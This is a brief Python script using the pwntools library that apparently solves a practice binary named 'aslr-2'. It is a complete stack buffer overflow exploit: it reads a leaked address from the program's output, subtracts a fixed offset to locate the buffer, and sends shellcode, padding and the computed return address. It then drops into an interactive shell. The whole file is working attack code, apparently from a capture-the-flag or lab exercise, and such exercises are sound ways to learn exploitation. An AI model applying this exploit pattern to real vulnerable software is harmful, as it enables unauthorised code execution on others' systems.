#!/usr/bin/env python

from pwn import *

offset = 140
shellcode = ''

magic = 136

with open('shellcode.bin', 'r') as f:
    shellcode = f.readline()

p = process('./aslr-2')

output = p.recv(0x100)

buffer = int(output.split()[15], 16) - magic

inp = shellcode
inp += 'A' * (offset - len(shellcode))
inp += p32(buffer)

p.send(inp)
p.interactive()
